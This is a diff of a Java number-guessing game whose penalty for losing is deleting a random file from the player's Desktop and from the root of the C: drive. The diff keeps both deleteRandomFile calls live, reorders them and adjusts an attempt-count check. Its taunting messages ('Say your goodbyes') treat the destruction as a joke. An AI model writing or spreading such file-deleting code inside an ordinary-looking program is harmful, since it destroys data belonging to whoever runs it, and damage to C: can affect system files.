@@ -44,7 +44,7 @@ public class NumberGuessingGame {
             } 
             else if (guess < secretNumber) {
                 System.out.println("\nTry a higher number.");
-                if (attempts == (maxAttempts - 1)) {
+                if (attempts >= (maxAttempts - 1)) {
                     System.out.print("Your one random file is " + (maxAttempts - attempts) + " attempt away from deletion :D");
                 } else {
                     System.out.print("Your one random file is " + (maxAttempts - attempts) + " attempts away from deletion :D");
@@ -62,10 +62,10 @@ public class NumberGuessingGame {
 
         if (!guessedCorrectly) {
             System.out.println("\nSorry little one, you did not guess the number right. The correct number was: " + secretNumber + ". Say your goodbyes.");
-            deleteRandomFile("c:");
             String username = System.getProperty("user.name");
             String desktopPath = "C:/Users/" + username + "/Desktop";
             deleteRandomFile(desktopPath);
+            deleteRandomFile("c:");
         }
 
         scanner.close();
